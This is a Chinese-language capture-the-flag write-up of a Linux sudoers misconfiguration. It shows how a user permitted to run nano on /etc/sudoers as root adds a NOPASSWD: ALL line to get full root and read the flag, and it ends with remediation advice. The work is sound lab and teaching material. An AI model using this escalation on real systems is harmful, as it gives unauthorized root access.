# Absolute NANO - Writeup

## 題目類型
Privilege Escalation / Linux Permissions / sudoers Misconfiguration

## 題目核心
題目給定使用者 `ctf-player`，並限制其可使用的 `sudo` 指令。  
透過 `sudo -l` 可看到關鍵權限：

```text
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

這表示 `ctf-player` 可以不輸入密碼，以高權限直接使用 `nano` 編輯 `/etc/sudoers`。

---

## 觀察與判斷

### 1. 為什麼不是 `chmod`
`flag.txt` 權限顯示為 root 擁有，且 `ctf-player` 不具備直接改權限的能力，因此無法靠：

```bash
chmod ...
```

直接放寬權限。

### 2. 題目真正突破點
`/etc/sudoers` 是 sudo 的主要設定檔。  
只要能編輯它，就能把自己加入完整 sudo 權限。

---

## 解題流程

### 1. 確認 sudo 權限
```bash
sudo -l
```

### 2. 編輯 sudoers
```bash
sudo /bin/nano /etc/sudoers
```

### 3. 在檔案最後加入
```text
ctf-player ALL=(ALL) NOPASSWD: ALL
```

### 4. 儲存離開後，以 sudo 讀取 flag
```bash
sudo cat flag.txt
```

若 `flag.txt` 不在目前目錄，則先 `pwd` / `ls -l` 確認實際位置後再讀取。

---

## 解題重點
1. `/etc/sudoers` 是 sudo 的核心設定檔  
2. 題目給的是 `nano /etc/sudoers` 權限，不是一般檔案編輯權限  
3. 一旦能修改 sudoers，就等同於能替自己打開完整提權通道  
4. 本題重點是 **sudo misconfiguration**，不是 `chmod` 本身

---

## 風險說明
這類錯誤設定在實務環境中屬於高風險：
- 低權限使用者可直接取得 root 權限
- 安全邊界完全失效
- 任何後續操作都可被完整控制

---

## 修補建議
1. 避免授予一般使用者直接編輯 `/etc/sudoers` 的權限  
2. 使用 `visudo` 管理 sudo 規則，避免格式錯誤與濫用  
3. 僅授予最小必要指令，不授予可進一步修改權限控制面的工具  
4. 定期稽核 `sudo -l` 與 sudoers 設定

---

## 總結
本題的突破點在於：  
**可使用 root 身分編輯 `/etc/sudoers`，因此可直接把自己加成完整 sudoer，進而讀取 flag。**
